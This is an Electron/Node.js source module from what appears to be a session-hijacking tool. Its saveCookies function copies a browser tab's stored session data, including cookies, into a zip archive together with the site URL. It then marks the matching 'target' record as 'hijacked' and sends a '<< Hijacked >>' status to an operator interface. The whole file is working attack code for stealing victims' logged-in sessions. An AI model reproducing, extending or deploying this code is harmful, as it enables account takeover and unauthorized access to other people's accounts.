const { cout } = require("../utils/server-helpers")
const { targetDB } = require("../utils/DB")
const { session } = require("electron")
const AdmZip = require("adm-zip")
const path = require("path")
const fs = require("fs")
const os = require("os")

const OBJ = {
    tabs: {},
    intervals: {},
    saveCookies(id, url) {
        return new Promise((resolve, reject) => {
            try {
                const oldSessionFolder = session.fromPartition(`persist:tab-${id}`, { cache: false }).storagePath
                const newSessionFolder = path.join(os.tmpdir(), id)

                fs.mkdirSync(newSessionFolder, { recursive: true })
                fs.cpSync(oldSessionFolder, newSessionFolder, { recursive: true })
                fs.writeFileSync(path.join(newSessionFolder, "app-url"), url, "utf-8")

                const admZip = new AdmZip()
                admZip.addLocalFolder(newSessionFolder)
                admZip.writeZip(path.join(process.__dirname, "ssd", "cookies", `${id}.wszip`), (err) => {
                    if (err) {
                        cout.err(err)
                        reject(false)
                    } else {
                        fs.rm(newSessionFolder, { recursive: true }, (err) => {
                            if (err) console.log(err)
                        })
                        const targetCollection = targetDB.collection(id, false)
                        targetCollection.update({}, { cookies: "hijacked" })

                        IO.emit(`set-status`, {
                            id,
                            type: "cookies",
                            value: "<< Hijacked >>"
                        })

                        IO.emit(`${id}-listener`, {
                            type: "response"
                        })

                        resolve(true)
                    }
                })
            } catch (error) {
                cout.err(error)
                reject(false)
            }
        })
    }
}

module.exports = OBJ